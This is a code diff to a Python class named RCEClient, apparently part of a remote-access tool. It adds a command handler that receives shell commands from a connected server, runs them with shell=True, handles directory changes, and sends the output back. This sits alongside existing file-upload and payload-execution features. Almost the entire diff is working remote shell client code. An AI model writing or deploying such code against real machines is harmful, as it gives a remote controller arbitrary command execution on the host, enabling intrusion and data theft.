@@ -1,3 +1,5 @@
+import os
+import subprocess
 import sys
 import traceback
 from pathlib import Path
@@ -15,6 +17,7 @@ class RCEClient(BaseClientThread):
 
     def __init__(self, host='localhost', port=6000, debug=False):
         super().__init__()
+        self.cwd = Path.cwd()
         self.__logger = Logger(self.__class__.__name__, debug)
         try:
             self.connect_to_server(host, port)
@@ -39,6 +42,9 @@ class RCEClient(BaseClientThread):
                 if message.is_type(MessageType.ECHO):
                     self.__logger.on_info(message.data.decode())
                     self.send_message(message)
+                elif message.is_type(MessageType.CMD):
+                    self.__logger.on_debug(f"Executing command:\n\t{message}")
+                    self.execute_command(message)
                 elif message.is_type(MessageType.FILE_UPLOAD):
                     self.__logger.on_debug("Receiving file...")
                     file_path = Path(message.data.decode())
@@ -96,6 +102,8 @@ class RCEClient(BaseClientThread):
         except AttributeError as e:
             self.__logger.on_error(e)
             self.send_message(Message(MessageType.ERROR, traceback.format_exc().encode()))
+        except OSError:
+            self.__logger.on_error("Connection closed by peer")
 
     def execute_payload(self):
         """
@@ -117,3 +125,41 @@ class RCEClient(BaseClientThread):
             self.__logger.on_debug(traceback.format_exc())
             self.send_message(
                 Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
+
+    def execute_command(self, message: Message):
+        """
+        Executes the shell command and sends its output back to the server.
+        :param message: The message containing the command to be executed.
+        :raises: OSError: If an error occurs while sending the output back to the server.
+        """
+        # noinspection PyBroadException
+        try:
+            if message.data.decode().startswith("cd"):
+                working_dir = message.data.decode().removeprefix("cd").strip()
+                working_dir = Path.home() if working_dir in ["", "~"] else working_dir
+
+                if not os.path.exists(working_dir):
+                    err = f"{working_dir} does not exist"
+                    self.__logger.on_error(err)
+                    self.send_message(Message(message_type=MessageType.ERROR, data=err.encode()))
+                    return
+
+                os.chdir(working_dir)
+                self.cwd = Path.cwd().absolute()
+
+                success_msg = f"Changed directory to {self.cwd}"
+                self.__logger.on_debug(success_msg)
+                self.send_message(Message(message_type=MessageType.ECHO, data=success_msg.encode()))
+            else:
+                cmd = subprocess.run(message.data.decode(), stdout=subprocess.PIPE, shell=True)
+                if not (output := cmd.stdout.decode()):
+                    return
+
+                output = "\n" + output
+                self.__logger.on_debug(f"Output from command execution:\n{output}")
+                self.send_message(Message(message_type=MessageType.ECHO, data=output.encode()))
+        except OSError:
+            self.__logger.on_error("Connection closed by peer")
+        except Exception:
+            self.__logger.on_error(traceback.format_exc())
+            self.send_message(Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
